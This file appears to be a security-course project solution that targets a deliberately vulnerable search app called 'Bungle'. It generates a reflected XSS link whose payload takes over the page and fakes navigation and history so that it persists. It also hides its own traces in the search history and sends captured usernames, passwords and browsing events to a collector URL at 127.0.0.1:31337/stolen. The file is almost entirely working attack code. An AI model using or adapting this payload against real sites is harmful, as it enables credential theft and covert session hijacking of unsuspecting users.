<meta charset="utf-8">
<script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
<script>

function payload(attacker) {
	function log(data) {
		console.log($.param(data));
		$.get(attacker, data);
	}

	function fakeButton(e, destination) {
		e.preventDefault(); /* do not follow the link */
		history.pushState(destination, "", destination); /* add a new history state */
		proxy(destination); /* render the fake HTML */
	}

	/* Used for buttons that make a POST request */
	function fakeButtonPOST(e, action) { 
		e.preventDefault(); /* do not follow the link */
		let destination = "./"; /* all buttons redirect to the front page */
		if (action == "login" || action == "create") {
			let user = $("#username").val();
			let pw = $("#userpass").val();
			$.post("./" + action, {username: user, password: pw}, function(data) {
				log({event: "login", user: user, password: pw});
				proxy(destination); /* render the fake HTML */
			});
		}
		else { /* logout */
			let user = $("#logged-in-user").text();
			$.post("./logout", function(data) {
				log({event: "logout", user: user});
				if (window.location.pathname == "/search") { /* add a new history state only when logging out from the search page */
					history.pushState(destination, "", destination);
				}
				proxy(destination); /* render the fake HTML */
			});
		}
	}

	function proxy(href) {
		$("html").load(href, function(){
			$("#bungle-lnk, #search-again-btn").click(function(e) { /* creating fake Bungle and Search Again buttons */
				let destination = "./";
				fakeButton(e, destination);
			});

			$("#search-btn").click(function(e) { /* creating a fake Search button */
				let q = encodeURIComponent($("#query").val()); /* the query */
				let destination = "./search?q=" + q;
				fakeButton(e, destination);
			});

			$("#log-in-btn").click(function(e) { /* creating a fake Login button */
				fakeButtonPOST(e, "login");
			});

			$("#new-account-btn").click(function(e) { /* creating a fake Create Account button */
				fakeButtonPOST(e, "create");
			});
			
			$("#log-out-btn").click(function(e) { /* creating a fake Logout button */
				fakeButtonPOST(e, "logout");
			});

			$("a:contains('payload(')").hide(); /* hide history items containing the term "payload(" */

			let loggedUser = $("#logged-in-user").text(); /* will be empty if no user is logged in */
			loggedUser ? log({event: "nav", uri: href, user: loggedUser}) : log({event: "nav", uri: href}); /* if not empty, log the username */
			
			$("html").show();
		});
	}

	$("html").hide();
	history.replaceState("./", "", "./");
	window.onpopstate = function(e) { /* will fire when "back" or "forward" buttons are pressed in the browser */
		proxy(e.state); 
	};
	proxy("./");
}

function makeLink(xssdefense, target, attacker) {
	if (xssdefense == 0) {
		return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" + encodeURIComponent("<script" + ">" + payload.toString() + ";payload(\"" + attacker + "\");</script" + ">");
	} 
	/*else {
	
	}*/
}

var xssdefense = 0;
var target = "http://trurl.cs.illinois.edu/";
var attacker = "http://127.0.0.1:31337/stolen";

$(function() {
	var url = makeLink(xssdefense, target, attacker);
	$("h3").html("<a target=\"run\" href=\"" + url + "\">Try Bungle!</a>");
});
</script>
<h3></h3>